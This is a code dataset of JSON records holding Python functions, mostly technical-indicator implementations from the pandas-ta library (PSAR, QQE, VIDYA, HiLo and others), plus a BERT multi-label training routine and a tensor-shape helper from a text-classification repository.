{"docstring": "\"\"\"Indicator: SMI Ergodic Indicator (SMIIO)\"\"\"\n# Validate arguments\n", "func_signal": "def smi(close, fast=None, slow=None, signal=None, scalar=None, offset=None, **kwargs):\n", "code": "close = verify_series(close)\nfast = int(fast) if fast and fast > 0 else 5\nslow = int(slow) if slow and slow > 0 else 20\nsignal = int(signal) if signal and signal > 0 else 5\nif slow < fast:\n    fast, slow = slow, fast\nscalar = float(scalar) if scalar else 1\noffset = get_offset(offset)\n\n# Calculate Result\nsmi = tsi(close, fast=fast, slow=slow, scalar=scalar)\nsignalma = ema(smi, signal)\nosc = smi - signalma\n\n# Offset\nif offset != 0:\n    smi = smi.shift(offset)\n    signalma = signalma.shift(offset)\n    osc = osc.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    smi.fillna(kwargs[\"fillna\"], inplace=True)\n    signalma.fillna(kwargs[\"fillna\"], inplace=True)\n    osc.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    smi.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    signalma.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    osc.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\n_scalar = f\"_{scalar}\" if scalar != 1 else \"\"\n_props = f\"_{fast}_{slow}_{signal}{_scalar}\"\nsmi.name = f\"SMI{_props}\"\nsignalma.name = f\"SMIs{_props}\"\nosc.name = f\"SMIo{_props}\"\nsmi.category = signalma.category = osc.category = \"momentum\"\n\n# Prepare DataFrame to return\ndata = {smi.name: smi, signalma.name: signalma, osc.name: osc}\ndf = DataFrame(data)\ndf.name = f\"SMI{_props}\"\ndf.category = smi.category\n\nreturn df", "path": "pandas-ta/pandas_ta/momentum/smi.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Elders Thermometer (THERMO)\"\"\"\n# Validate arguments\n", "func_signal": "def thermo(high, low, length=None, long=None, short=None, mamode=None, drift=None, offset=None, **kwargs):\n", "code": "high = verify_series(high)\nlow = verify_series(low)\nlength = int(length) if length and length > 0 else 20\nlong = float(long) if long and long > 0 else 2\nshort = float(short) if short and short > 0 else 0.5\nmamode = mamode if isinstance(mamode, str) else \"ema\"\ndrift = get_drift(drift)\noffset = get_offset(offset)\nasint = kwargs.pop(\"asint\", True)\n\n# Calculate Result\nthermoL = (low.shift(drift) - low).abs()\nthermoH = (high - high.shift(drift)).abs()\n\nthermo = thermoL\nthermo = thermo.where(thermoH < thermoL, thermoH)\nthermo.index = high.index\n\nthermo_ma = ma(mamode, thermo, length=length)\n\n# Create signals\nthermo_long = thermo < (thermo_ma * long)\nthermo_short = thermo > (thermo_ma * short)\n\n# Binary output, useful for signals\nif asint:\n    thermo_long = thermo_long.astype(int)  \n    thermo_short = thermo_short.astype(int)\n\n# Offset\nif offset != 0:\n    thermo = thermo.shift(offset)\n    thermo_ma = thermo_ma.shift(offset)\n    therthermo_longmo_ma = thermo_ma.shift(offset)\n    thermo_short = thermo_ma.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    thermo.fillna(kwargs[\"fillna\"], inplace=True)\n    thermo_ma.fillna(kwargs[\"fillna\"], inplace=True)\n    thermo_long.fillna(kwargs[\"fillna\"], inplace=True)\n    thermo_short.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    thermo.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    thermo_ma.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    thermo_long.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    thermo_short.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\n_props = f\"_{length}_{long}_{short}\"\nthermo.name = f\"THERMO{_props}\"\nthermo_ma.name = f\"THERMOma{_props}\"\nthermo_long.name = f\"THERMOl{_props}\"\nthermo_short.name = f\"THERMOs{_props}\"\n\nthermo.category = thermo_ma.category = thermo_long.category = thermo_short.category = \"volatility\"\n\n# Prepare Dataframe to return\ndata = {thermo.name: thermo, thermo_ma.name: thermo_ma, thermo_long.name: thermo_long, thermo_short.name: thermo_short}\ndf = DataFrame(data)\ndf.name = f\"THERMO{_props}\"\ndf.category = thermo.category\n\nreturn df", "path": "pandas-ta/pandas_ta/volatility/thermo.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Parabolic Stop and Reverse (PSAR)\"\"\"\n# Validate Arguments\n", "func_signal": "def psar(high, low, close=None, af=None, max_af=None, offset=None, **kwargs):\n", "code": "high = verify_series(high)\nlow = verify_series(low)\naf = float(af) if af and af > 0 else 0.02\nmax_af = float(max_af) if max_af and max_af > 0 else 0.2\noffset = get_offset(offset)\n\n# Initialize\nm = high.shape[0]\naf0 = af\nbullish = True\nhigh_point = high.iloc[0]\nlow_point = low.iloc[0]\n\nif close is not None:\n    close = verify_series(close)\n    sar = close.copy()\nelse:\n    sar = low.copy()\n\nlong = Series(npNaN, index=sar.index)\nshort = long.copy()\nreversal = Series(False, index=sar.index)\n_af = long.copy()\n_af.iloc[0:2] = af0\n\n# Calculate Result\nfor i in range(2, m):\n    reverse = False\n    _af[i] = af\n\n    if bullish:\n        sar[i] = sar[i - 1] + af * (high_point - sar[i - 1])\n\n        if low[i] < sar[i]:\n            bullish, reverse, af = False, True, af0\n            sar[i] = high_point\n            low_point = low[i]\n    else:\n        sar[i] = sar[i - 1] + af * (low_point - sar[i - 1])\n\n        if high[i] > sar[i]:\n            bullish, reverse, af = True, True, af0\n            sar[i] = low_point\n            high_point = high[i]\n\n    reversal[i] = reverse\n\n    if not reverse:\n        if bullish:\n            if high[i] > high_point:\n                high_point = high[i]\n                af = min(af + af0, max_af)\n            if low[i - 1] < sar[i]:\n                sar[i] = low[i - 1]\n            if low[i - 2] < sar[i]:\n                sar[i] = low[i - 2]\n        else:\n            if low[i] < low_point:\n                low_point = low[i]\n                af = min(af + af0, max_af)\n            if high[i - 1] > sar[i]:\n                sar[i] = high[i - 1]\n            if high[i - 2] > sar[i]:\n                sar[i] = high[i - 2]\n\n    if bullish:\n        long[i] = sar[i]\n    else:\n        short[i] = sar[i]\n\n# Offset\nif offset != 0:\n    _af = _af.shift(offset)\n    long = long.shift(offset)\n    short = short.shift(offset)\n    reversal = reversal.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    _af.fillna(kwargs[\"fillna\"], inplace=True)\n    long.fillna(kwargs[\"fillna\"], inplace=True)\n    short.fillna(kwargs[\"fillna\"], inplace=True)\n    reversal.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    _af.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    long.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    short.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    reversal.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Prepare DataFrame to return\n_params = f\"_{af0}_{max_af}\"\ndata = {\n    f\"PSARl{_params}\": long,\n    f\"PSARs{_params}\": short,\n    f\"PSARaf{_params}\": _af,\n    f\"PSARr{_params}\": reversal,\n}\npsardf = DataFrame(data)\npsardf.name = f\"PSAR{_params}\"\npsardf.category = long.category = short.category = \"trend\"\n\nreturn psardf", "path": "pandas-ta/pandas_ta/trend/psar.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Elder's Force Index (EFI)\"\"\"\n# Validate arguments\n", "func_signal": "def efi(close, volume, length=None, drift=None, mamode=None, offset=None, **kwargs):\n", "code": "close = verify_series(close)\nvolume = verify_series(volume)\nlength = int(length) if length and length > 0 else 13\ndrift = get_drift(drift)\nmamode = mamode if isinstance(mamode, str) else \"ema\"\noffset = get_offset(offset)\n\n# Calculate Result\npv_diff = close.diff(drift) * volume\nefi = ma(mamode, pv_diff, length=length)\n\n# Offset\nif offset != 0:\n    efi = efi.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    efi.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    efi.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\nefi.name = f\"EFI_{length}\"\nefi.category = \"volume\"\n\nreturn efi", "path": "pandas-ta/pandas_ta/volume/efi.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Variable Index Dynamic Average (VIDYA)\"\"\"\n# Validate Arguments\n", "func_signal": "def vidya(close, length=None, drift=None, offset=None, **kwargs):\n", "code": "close = verify_series(close)\nlength = int(length) if length and length > 0 else 14\ndrift = get_drift(drift)\noffset = get_offset(offset)\n\ndef _cmo(source: Series, n:int , d: int):\n    \"\"\"Chande Momentum Oscillator (CMO) Patch\n    For some reason: from pandas_ta.momentum import cmo causes\n    pandas_ta.momentum.coppock to not be able to import it's\n    wma like from pandas_ta.overlap import wma?\n    Weird Circular TypeError!?!\n    \"\"\"\n    mom = source.diff(d)\n    positive = mom.copy().clip(lower=0)\n    negative = mom.copy().clip(upper=0).abs()\n    pos_sum = positive.rolling(n).sum()\n    neg_sum = negative.rolling(n).sum()\n    return (pos_sum - neg_sum) / (pos_sum + neg_sum)\n\n# Calculate Result\nm = close.size\nalpha = 2 / (length + 1)\nabs_cmo = _cmo(close, length, drift).abs()\nvidya = Series(0, index=close.index)\nfor i in range(length, m):\n    vidya.iloc[i] = alpha * abs_cmo.iloc[i] * close.iloc[i] + vidya.iloc[i - 1] * (1 - alpha * abs_cmo.iloc[i])\nvidya.replace({0: npNaN}, inplace=True)\n\n# Offset\nif offset != 0:\n    vidya = vidya.shift(offset)\n\n# Name & Category\nvidya.name = f\"VIDYA_{length}\"\nvidya.category = \"overlap\"\n\nreturn vidya", "path": "pandas-ta/pandas_ta/overlap/vidya.py", "commit_date": "2020-11-13 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Quantitative Qualitative Estimation (QQE)\"\"\"\n# Validate arguments\n", "func_signal": "def qqe(close, length=None, smooth=None, factor=None, mamode=None, drift=None, offset=None, **kwargs):\n", "code": "close = verify_series(close)\nlength = int(length) if length and length > 0 else 14\nsmooth = int(smooth) if smooth and smooth > 0 else 5\nfactor = float(factor) if factor else 4.236\nmamode = mamode if isinstance(mamode, str) else \"ema\"\ndrift = get_drift(drift)\noffset = get_offset(offset)\n\n# Calculate Result\nrsi_ = rsi(close, length)\n_mode = mamode.lower()[0] if mamode != \"ema\" else \"\"\nrsi_ma = ma(mamode, rsi_, length=smooth)\n\n# RSI MA True Range\nrsi_ma_tr = rsi_ma.diff(drift).abs()\n\n# Double Smooth the RSI MA True Range using Wilder's Length with a default\n# width of 4.236.\nwilders_length = 2 * length - 1\nsmoothed_rsi_tr_ma = ma(\"ema\", rsi_ma_tr, length=wilders_length)\ndar = factor * ma(\"ema\", smoothed_rsi_tr_ma, length=wilders_length)\n\n# Create the Upper and Lower Bands around RSI MA.\nupperband = rsi_ma + dar\nlowerband = rsi_ma - dar\n\nm = close.size\nlong = Series(0, index=close.index)\nshort = Series(0, index=close.index)\ntrend = Series(1, index=close.index)\nqqe = Series(rsi_ma.iloc[0], index=close.index)\nqqe_long = Series(npNaN, index=close.index)\nqqe_short = Series(npNaN, index=close.index)\n\nfor i in range(1, m):\n    c_rsi, p_rsi = rsi_ma.iloc[i], rsi_ma.iloc[i - 1]\n    c_long, p_long = long.iloc[i - 1], long.iloc[i - 2]\n    c_short, p_short = short.iloc[i - 1], short.iloc[i - 2]\n\n    # Long Line\n    if p_rsi > c_long and c_rsi > c_long:\n        long.iloc[i] = npMaximum(c_long, lowerband.iloc[i])\n    else:\n        long.iloc[i] = lowerband.iloc[i]\n\n    # Short Line\n    if p_rsi < c_short and c_rsi < c_short:\n        short.iloc[i] = npMinimum(c_short, upperband.iloc[i])\n    else:\n        short.iloc[i] = upperband.iloc[i]\n\n    # Trend & QQE Calculation\n    # Long: Current RSI_MA value Crosses the Prior Short Line Value\n    # Short: Current RSI_MA Crosses the Prior Long Line Value\n    if (c_rsi > c_short and p_rsi < p_short) or (c_rsi <= c_short and p_rsi >= p_short):\n        trend.iloc[i] = 1\n        qqe.iloc[i] = qqe_long.iloc[i] = long.iloc[i]\n    elif (c_rsi > c_long and p_rsi < p_long) or (c_rsi <= c_long and p_rsi >= p_long):\n        trend.iloc[i] = -1\n        qqe.iloc[i] = qqe_short.iloc[i] = short.iloc[i]\n    else:\n        trend.iloc[i] = trend.iloc[i - 1]\n        if trend.iloc[i] == 1:\n            qqe.iloc[i] = qqe_long.iloc[i] = long.iloc[i]\n        else:\n            qqe.iloc[i] = qqe_short.iloc[i]  = short.iloc[i]\n\n# Offset\nif offset != 0:\n    rsi_ma = rsi_ma.shift(offset)\n    qqe = qqe.shift(offset)\n    long = long.shift(offset)\n    short = short.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    rsi_ma.fillna(kwargs[\"fillna\"], inplace=True)\n    qqe.fillna(kwargs[\"fillna\"], inplace=True)\n    long.fillna(kwargs[\"fillna\"], inplace=True)\n    short.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    rsi_ma.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    qqe.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    long.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    short.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\n_props = f\"{_mode}_{length}_{smooth}_{factor}\"\nqqe.name = f\"QQE{_props}\"\nrsi_ma.name = f\"QQE{_props}_RSI{_mode.upper()}MA\"\nlong.name = f\"QQEl{_props}\"\nshort.name = f\"QQEs{_props}\"\nqqe.category = rsi_ma.category = \"momentum\"\nlong.category = short.category = qqe.category\n\n# Prepare DataFrame to return\ndata = {\n    qqe.name: qqe, rsi_ma.name: rsi_ma,\n    # long.name: long, short.name: short\n    long.name: qqe_long, short.name: qqe_short\n}\ndf = DataFrame(data)\ndf.name = f\"QQE{_props}\"\ndf.category = qqe.category\n\nreturn df", "path": "pandas-ta/pandas_ta/momentum/qqe.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Candle Type: Doji\"\"\"\n# Validate Arguments\n", "func_signal": "def cdl_doji( open_, high, low, close, length=None, factor=None, scalar=None, asint=True, offset=None, **kwargs):\n", "code": "open_ = verify_series(open_)\nhigh = verify_series(high)\nlow = verify_series(low)\nclose = verify_series(close)\nlength = int(length) if length and length > 0 else 10\nfactor = float(factor) if is_percent(factor) else 10\nscalar = float(scalar) if scalar else 100\noffset = get_offset(offset)\nnaive = kwargs.pop(\"naive\", False)\n\n# Calculate Result\nbody = real_body(open_, close).abs()\nhl_range = high_low_range(high, low).abs()\nhl_range_avg = sma(hl_range, length)\ndoji = body < 0.01 * factor * hl_range_avg\n\nif naive:\n    doji.iloc[:length] = body < 0.01 * factor * hl_range\nif asint:\n    doji = scalar * doji.astype(int)\n\n# Offset\nif offset != 0:\n    doji = doji.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    doji.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    doji.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\ndoji.name = f\"CDL_DOJI_{length}_{0.01 * factor}\"\ndoji.category = \"candles\"\n\nreturn doji", "path": "pandas-ta/pandas_ta/candles/cdl_doji.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Acceleration Bands (ACCBANDS)\"\"\"\n# Validate arguments\n", "func_signal": "def accbands(high, low, close, length=None, c=None, drift=None, mamode=None, offset=None, **kwargs):\n", "code": "high = verify_series(high)\nlow = verify_series(low)\nclose = verify_series(close)\nhigh_low_range = non_zero_range(high, low)\nlength = int(length) if length and length > 0 else 20\nc = float(c) if c and c > 0 else 4\nmamode = mamode if isinstance(mamode, str) else \"sma\"\ndrift = get_drift(drift)\noffset = get_offset(offset)\n\n# Calculate Result\nhl_ratio = high_low_range / (high + low)\nhl_ratio *= c\n_lower = low * (1 - hl_ratio)\n_upper = high * (1 + hl_ratio)\n\nlower = ma(mamode, _lower, length=length)\nmid = ma(mamode, close, length=length)\nupper = ma(mamode, _upper, length=length)\n\n# Offset\nif offset != 0:\n    lower = lower.shift(offset)\n    mid = mid.shift(offset)\n    upper = upper.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    lower.fillna(kwargs[\"fillna\"], inplace=True)\n    mid.fillna(kwargs[\"fillna\"], inplace=True)\n    upper.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    lower.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    mid.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    upper.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\nlower.name = f\"ACCBL_{length}\"\nmid.name = f\"ACCBM_{length}\"\nupper.name = f\"ACCBU_{length}\"\nmid.category = upper.category = lower.category = \"volatility\"\n\n# Prepare DataFrame to return\ndata = {lower.name: lower, mid.name: mid, upper.name: upper}\naccbandsdf = DataFrame(data)\naccbandsdf.name = f\"ACCBANDS_{length}\"\naccbandsdf.category = mid.category\n\nreturn accbandsdf", "path": "pandas-ta/pandas_ta/volatility/accbands.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: TTM Trend (TTM_TRND)\"\"\"\n# Validate arguments\n", "func_signal": "def ttm_trend(high, low, close, length=None, offset=None, **kwargs):\n", "code": "high = verify_series(high)\nlow = verify_series(low)\nclose = verify_series(close)\nlength = int(length) if length and length > 0 else 6\noffset = get_offset(offset)\n\n# Calculate Result\ntrend_avg = hl2(high, low)\nfor i in range(1, length):\n    trend_avg = trend_avg + hl2(high.shift(i), low.shift(i))\n\ntrend_avg = trend_avg / length\n\ntm_trend = (close > trend_avg).astype(int)\ntm_trend.replace(0, -1, inplace=True)\n\n# Offset\nif offset != 0:\n    tm_trend = tm_trend.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    tm_trend.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    tm_trend.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name and Categorize it\ntm_trend.name = f\"TTM_TRND_{length}\"\ntm_trend.category = \"momentum\"\n\n# Prepare DataFrame to return\ndata = {tm_trend.name: tm_trend}\ndf = DataFrame(data)\ndf.name = f\"TTMTREND_{length}\"\ndf.category = tm_trend.category\n\nreturn df", "path": "pandas-ta/pandas_ta/trend/ttm_trend.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Fibonacci's Weighted Moving Average (FWMA)\"\"\"\n# Validate Arguments\n", "func_signal": "def fwma(close, length=None, asc=None, offset=None, **kwargs):\n", "code": "close = verify_series(close)\nlength = int(length) if length and length > 0 else 10\nasc = asc if asc else True\noffset = get_offset(offset)\n\n# Calculate Result\nfibs = fibonacci(n=length, weighted=True)\nfwma = close.rolling(length, min_periods=length).apply(weights(fibs), raw=True)\n\n# Offset\nif offset != 0:\n    fwma = fwma.shift(offset)\n\n# Name & Category\nfwma.name = f\"FWMA_{length}\"\nfwma.category = \"overlap\"\n\nreturn fwma", "path": "pandas-ta/pandas_ta/overlap/fwma.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Price Distance (PDIST)\"\"\"\n# Validate Arguments\n", "func_signal": "def pdist(open_, high, low, close, drift=None, offset=None, **kwargs):\n", "code": "open_ = verify_series(open_)\nhigh = verify_series(high)\nlow = verify_series(low)\nclose = verify_series(close)\ndrift = get_drift(drift)\noffset = get_offset(offset)\n\n# Calculate Result\npdist = 2 * non_zero_range(high, low)\npdist += non_zero_range(open_, close.shift(drift)).abs()\npdist -= non_zero_range(close, open_).abs()\n\n# Offset\nif offset != 0:\n    pdist = pdist.shift(offset)\n\n# Name & Category\npdist.name = \"PDIST\"\npdist.category = \"volatility\"\n\nreturn pdist", "path": "pandas-ta/pandas_ta/volatility/pdist.py", "commit_date": "2020-10-05 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Variance\"\"\"\n# Validate Arguments\n", "func_signal": "def variance(close, length=None, ddof=1, offset=None, **kwargs):\n", "code": "close = verify_series(close)\nlength = int(length) if length and length > 1 else 30\nddof = int(ddof) if ddof >= 0 and ddof < length else 1\n\nmin_periods = int(kwargs[\"min_periods\"]) if \"min_periods\" in kwargs and kwargs[\"min_periods\"] is not None else length\noffset = get_offset(offset)\n\n# Calculate Result\nvariance = close.rolling(length, min_periods=min_periods).var(ddof)\n\n# Offset\nif offset != 0:\n    variance = variance.shift(offset)\n\n# Name & Category\nvariance.name = f\"VAR_{length}\"\nvariance.category = \"statistics\"\n\nreturn variance", "path": "pandas-ta/pandas_ta/statistics/variance.py", "commit_date": "2020-11-24 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "\"\"\"Indicator: Gann HiLo (HiLo)\"\"\"\n# Validate Arguments\n", "func_signal": "def hilo(high, low, close, high_length=None, low_length=None, mamode=None, offset=None, **kwargs):\n", "code": "high = verify_series(high)\nlow = verify_series(low)\nclose = verify_series(close)\nhigh_length = int(high_length) if high_length and high_length > 0 else 13\nlow_length = int(low_length) if low_length and low_length > 0 else 21\nmamode = mamode if isinstance(mamode, str) else \"sma\"\noffset = get_offset(offset)\n\n# Calculate Result\nm = close.size\nhilo = Series(npNaN, index=close.index)\nlong = Series(npNaN, index=close.index)\nshort = Series(npNaN, index=close.index)\n\nhigh_ma = ma(mamode, high, length=high_length)\nlow_ma = ma(mamode, low, length=low_length)\n\nfor i in range(1, m):\n    if close.iloc[i] > high_ma.iloc[i - 1]:\n        hilo.iloc[i] = long.iloc[i] = low_ma.iloc[i]\n    elif close.iloc[i] < low_ma.iloc[i - 1]:\n        hilo.iloc[i] = short.iloc[i] = high_ma.iloc[i]\n    else:\n        hilo.iloc[i] = hilo.iloc[i - 1]\n        long.iloc[i] = short.iloc[i] = hilo.iloc[i - 1]\n\n# Offset\nif offset != 0:\n    hilo = hilo.shift(offset)\n    long = long.shift(offset)\n    short = short.shift(offset)\n\n# Handle fills\nif \"fillna\" in kwargs:\n    hilo.fillna(kwargs[\"fillna\"], inplace=True)\n    long.fillna(kwargs[\"fillna\"], inplace=True)\n    short.fillna(kwargs[\"fillna\"], inplace=True)\nif \"fill_method\" in kwargs:\n    hilo.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    long.fillna(method=kwargs[\"fill_method\"], inplace=True)\n    short.fillna(method=kwargs[\"fill_method\"], inplace=True)\n\n# Name & Category\n_props = f\"_{high_length}_{low_length}\"\ndata = {f\"HILO{_props}\": hilo, f\"HILOl{_props}\": long, f\"HILOs{_props}\": short}\ndf = DataFrame(data, index=close.index)\n\ndf.name = f\"HILO{_props}\"\ndf.category = \"overlap\"\n\nreturn df", "path": "pandas-ta/pandas_ta/overlap/hilo.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "twopirllc/pandas-ta", "stars": 4576, "license": "mit", "language": "python", "size": 64762}
{"docstring": "# 1. get training data and vocabulary & labels dict\n", "func_signal": "def main(_):\n", "code": "word2index, label2index, trainX, trainY, vaildX, vaildY, testX, testY = load_data(FLAGS.cache_file_h5py,FLAGS.cache_file_pickle)\nvocab_size = len(word2index); print(\"bert model.vocab_size:\", vocab_size);\nnum_labels = len(label2index); print(\"num_labels:\", num_labels); cls_id=word2index['CLS'];print(\"id of 'CLS':\",word2index['CLS'])\nnum_examples, FLAGS.max_seq_length = trainX.shape;print(\"num_examples of training:\", num_examples, \";max_seq_length:\", FLAGS.max_seq_length)\n\n# 2. create model, define train operation\nbert_config = modeling.BertConfig(vocab_size=len(word2index), hidden_size=FLAGS.hidden_size, num_hidden_layers=FLAGS.num_hidden_layers,\n                                  num_attention_heads=FLAGS.num_attention_heads,intermediate_size=FLAGS.intermediate_size)\ninput_ids = tf.placeholder(tf.int32, [None, FLAGS.max_seq_length], name=\"input_ids\") # FLAGS.batch_size\ninput_mask = tf.placeholder(tf.int32, [None, FLAGS.max_seq_length], name=\"input_mask\")\nsegment_ids = tf.placeholder(tf.int32, [None,FLAGS.max_seq_length],name=\"segment_ids\")\nlabel_ids = tf.placeholder(tf.float32, [None,num_labels], name=\"label_ids\")\nis_training = tf.placeholder(tf.bool, name=\"is_training\") # FLAGS.is_training\n\nuse_one_hot_embeddings = False\nloss, per_example_loss, logits, probabilities, model = create_model(bert_config, is_training, input_ids, input_mask,\n                                                        segment_ids, label_ids, num_labels,use_one_hot_embeddings)\n# define train operation\n#num_train_steps = int(float(num_examples) / float(FLAGS.batch_size * FLAGS.num_epochs)); use_tpu=False; num_warmup_steps = int(num_train_steps * 0.1)\n#train_op = optimization.create_optimizer(loss, FLAGS.learning_rate, num_train_steps, num_warmup_steps, use_tpu)\nglobal_step = tf.Variable(0, trainable=False, name=\"Global_Step\")\ntrain_op = tf.contrib.layers.optimize_loss(loss, global_step=global_step, learning_rate=FLAGS.learning_rate,optimizer=\"Adam\", clip_gradients=3.0)\n\n# 3. train the model by calling create model, get loss\ngpu_config = tf.ConfigProto()\ngpu_config.gpu_options.allow_growth = True\nsess = tf.Session(config=gpu_config)\nsess.run(tf.global_variables_initializer())\nsaver = tf.train.Saver()\nif os.path.exists(FLAGS.ckpt_dir + \"checkpoint\"):\n    print(\"Checkpoint Exists. Restoring Variables from Checkpoint.\")\n    saver.restore(sess, tf.train.latest_checkpoint(FLAGS.ckpt_dir))\nnumber_of_training_data = len(trainX)\niteration = 0\ncurr_epoch = 0 #sess.run(textCNN.epoch_step)\nbatch_size = FLAGS.batch_size\nfor epoch in range(curr_epoch, FLAGS.num_epochs):\n    loss_total, counter = 0.0, 0\n    for start, end in zip(range(0, number_of_training_data, batch_size),range(batch_size, number_of_training_data, batch_size)):\n        iteration = iteration + 1 ###\n        input_mask_, segment_ids_, input_ids_=get_input_mask_segment_ids(trainX[start:end],cls_id) # input_ids_,input_mask_,segment_ids_\n        feed_dict = {input_ids: input_ids_, input_mask: input_mask_, segment_ids:segment_ids_,\n                     label_ids:trainY[start:end],is_training:True}\n        curr_loss,_ = sess.run([loss,train_op], feed_dict)\n        loss_total, counter = loss_total + curr_loss, counter + 1\n        if counter % 30 == 0:\n            print(epoch,\"\\t\",iteration,\"\\tloss:\",loss_total/float(counter),\"\\tcurrent_loss:\",curr_loss)\n        if counter % 300==0:\n            print(\"input_ids[\",start,\"]:\",input_ids_[0]);#print(\"trainY[start:end]:\",trainY[start:end])\n            try:\n                target_labels = get_target_label_short_batch(trainY[start:end]);#print(\"target_labels:\",target_labels)\n                print(\"trainY[\",start,\"]:\",target_labels[0])\n            except:\n                pass\n        # evaulation\n        if start!=0 and start % (1000 * FLAGS.batch_size) == 0:\n            eval_loss, f1_score, f1_micro, f1_macro = do_eval(sess,input_ids,input_mask,segment_ids,label_ids,is_training,loss,\n                                                              probabilities,vaildX, vaildY, num_labels,batch_size,cls_id)\n            print(\"Epoch %d Validation Loss:%.3f\\tF1 Score:%.3f\\tF1_micro:%.3f\\tF1_macro:%.3f\" % (\n                epoch, eval_loss, f1_score, f1_micro, f1_macro))\n            # save model to checkpoint\n            #if start % (4000 * FLAGS.batch_size)==0:\n            save_path = FLAGS.ckpt_dir + \"model.ckpt\"\n            print(\"Going to save model..\")\n            saver.save(sess, save_path, global_step=epoch)", "path": "text_classification/a00_Bert/train_bert_multi-label.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
{"docstring": "\"\"\"Returns a list of the shape of tensor, preferring static dimensions.\n\nArgs:\n  tensor: A tf.Tensor object to find the shape of.\n  expected_rank: (optional) int. The expected rank of `tensor`. If this is\n    specified and the `tensor` has a different rank, and exception will be\n    thrown.\n  name: Optional name of the tensor for the error message.\n\nReturns:\n  A list of dimensions of the shape of tensor. All static dimensions will\n  be returned as python integers, and dynamic dimensions will be returned\n  as tf.Tensor scalars.\n\"\"\"\n", "func_signal": "def get_shape_list(tensor, expected_rank=None, name=None):\n", "code": "if name is None:\n  name = tensor.name\n\nif expected_rank is not None:\n  assert_rank(tensor, expected_rank, name)\n\nshape = tensor.shape.as_list()\n\nnon_static_indexes = []\nfor (index, dim) in enumerate(shape):\n  if dim is None:\n    non_static_indexes.append(index)\n\nif not non_static_indexes:\n  return shape\n\ndyn_shape = tf.shape(tensor)\nfor index in non_static_indexes:\n  shape[index] = dyn_shape[index]\nreturn shape", "path": "text_classification/a00_Bert/bert_modeling.py", "commit_date": "2018-11-24 00:00:00", "repo_name": "brightmart/text_classification", "stars": 7721, "license": "mit", "language": "python", "size": 14810}
